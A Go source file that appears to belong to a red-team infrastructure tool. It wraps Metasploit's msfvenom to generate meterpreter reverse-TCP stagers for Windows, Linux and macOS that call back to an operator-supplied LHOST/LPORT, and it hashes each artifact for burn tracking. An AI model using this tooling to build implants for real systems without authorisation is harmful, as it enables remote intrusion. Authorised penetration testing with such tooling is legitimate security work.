// Package msfvenom adapts the upstream msfvenom payload generator (part of the
// Metasploit Framework) to RInfra's payload.Generator interface. It produces
// meterpreter stagers that call back to a deployed Metasploit listener.
//
// SCOPE: this adapter INVOKES the operator's installed upstream msfvenom binary
// with parameters derived from the Spec. It authors no payload bytes, encoders,
// or evasion logic — it only assembles the argument vector and orchestrates the
// binary, then records the artifact's hash for burn tracking.
package msfvenom

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/rinfra/rinfra/internal/payload"
)

func init() { payload.Register(&generator{}) }

// binaryName is the upstream tool this adapter shells out to. It must be
// installed by the operator; RInfra never bundles it.
const binaryName = "msfvenom"

type generator struct {
	// lookPath/runCommand/outputDir are seams so tests can exercise argv
	// construction without the real binary or filesystem side effects.
	lookPath   func(string) (string, error)
	runCommand func(ctx context.Context, name string, args ...string) ([]byte, error)
	outputDir  string
}

func (g *generator) Name() string { return "msfvenom" }

// PairsWith: msfvenom stagers connect back to a Metasploit/meterpreter listener.
func (g *generator) PairsWith() []string { return []string{"metasploit"} }

func (g *generator) lookPathFn() func(string) (string, error) {
	if g.lookPath != nil {
		return g.lookPath
	}
	return exec.LookPath
}

func (g *generator) runFn() func(ctx context.Context, name string, args ...string) ([]byte, error) {
	if g.runCommand != nil {
		return g.runCommand
	}
	return func(ctx context.Context, name string, args ...string) ([]byte, error) {
		return exec.CommandContext(ctx, name, args...).Output()
	}
}

// Generate builds the msfvenom argument vector from spec, invokes the installed
// binary, writes the artifact to the engagement's payload directory, hashes it,
// and returns the Artifact metadata.
func (g *generator) Generate(ctx context.Context, spec payload.Spec) (payload.Artifact, error) {
	if spec.Callback.Host == "" {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: Callback.Host (LHOST) is required")
	}
	if spec.Callback.Port == 0 {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: Callback.Port (LPORT) is required")
	}
	if spec.Format == "" {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: Format is required")
	}

	bin, err := g.lookPathFn()(binaryName)
	if err != nil {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: %s not found on PATH (operator must install it): %w", binaryName, err)
	}

	outDir := g.outputDir
	if outDir == "" {
		outDir = os.TempDir()
	}
	// Unique per generation: re-running or generating concurrently for the same
	// format must not overwrite a prior artifact whose hash/path is already
	// recorded for burn tracking.
	outPath := filepath.Join(outDir, fmt.Sprintf("rinfra-stager-%s.%s", uniqueToken(), safeExt(spec.Format)))

	args := buildArgs(spec, outPath)
	if _, err := g.runFn()(ctx, bin, args...); err != nil {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: run %s: %w", binaryName, err)
	}

	sum, err := hashFile(outPath)
	if err != nil {
		return payload.Artifact{}, fmt.Errorf("msfvenom.Generate: hash artifact: %w", err)
	}

	return payload.Artifact{
		Path:   outPath,
		SHA256: sum,
		Format: spec.Format,
	}, nil
}

// buildArgs assembles the msfvenom argument vector. The payload module is
// selected from the target platform; LHOST/LPORT come from the callback; the
// output format and file are appended. Extra options are passed through as-is.
func buildArgs(spec payload.Spec, outPath string) []string {
	args := []string{
		"-p", payloadModule(spec),
		fmt.Sprintf("LHOST=%s", spec.Callback.Host),
		fmt.Sprintf("LPORT=%d", spec.Callback.Port),
	}
	if spec.Arch != "" {
		args = append(args, "-a", msfArch(spec.Arch))
	}
	if spec.Platform != "" {
		args = append(args, "--platform", msfPlatform(spec.Platform))
	}
	// Deterministic ordering of passthrough options for testability.
	for _, k := range sortedKeys(spec.Extra) {
		args = append(args, fmt.Sprintf("%s=%s", k, spec.Extra[k]))
	}
	args = append(args, "-f", spec.Format, "-o", outPath)
	return args
}

// payloadModule maps the target platform/arch to the standard meterpreter
// reverse-TCP payload MODULE NAME. This selects an upstream module; it does not
// author payload content.
func payloadModule(spec payload.Spec) string {
	arch := msfArch(spec.Arch)
	switch strings.ToLower(spec.Platform) {
	case "windows":
		if arch == "x64" {
			return "windows/x64/meterpreter/reverse_tcp"
		}
		return "windows/meterpreter/reverse_tcp"
	case "linux":
		if arch == "x64" {
			return "linux/x64/meterpreter/reverse_tcp"
		}
		return "linux/x86/meterpreter/reverse_tcp"
	case "macos", "osx":
		return "osx/x64/meterpreter/reverse_tcp"
	default:
		// Platform-neutral default when unspecified.
		return "windows/x64/meterpreter/reverse_tcp"
	}
}

func msfArch(arch string) string {
	switch strings.ToLower(arch) {
	case "x86", "i386", "386":
		return "x86"
	case "", "x64", "amd64", "x86_64":
		return "x64"
	default:
		return strings.ToLower(arch)
	}
}

func msfPlatform(p string) string {
	if strings.ToLower(p) == "macos" {
		return "osx"
	}
	return strings.ToLower(p)
}

func safeExt(format string) string {
	if strings.ToLower(format) == "raw" {
		return "bin"
	}
	return strings.ToLower(format)
}

func sortedKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	for i := 1; i < len(keys); i++ {
		for j := i; j > 0 && keys[j-1] > keys[j]; j-- {
			keys[j-1], keys[j] = keys[j], keys[j-1]
		}
	}
	return keys
}

// uniqueToken returns a short random hex string used to keep generated artifact
// filenames unique across runs.
func uniqueToken() string {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		// Fall back to a time-based token; uniqueness is best-effort here.
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b[:])
}

func hashFile(path string) (string, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:]), nil
}
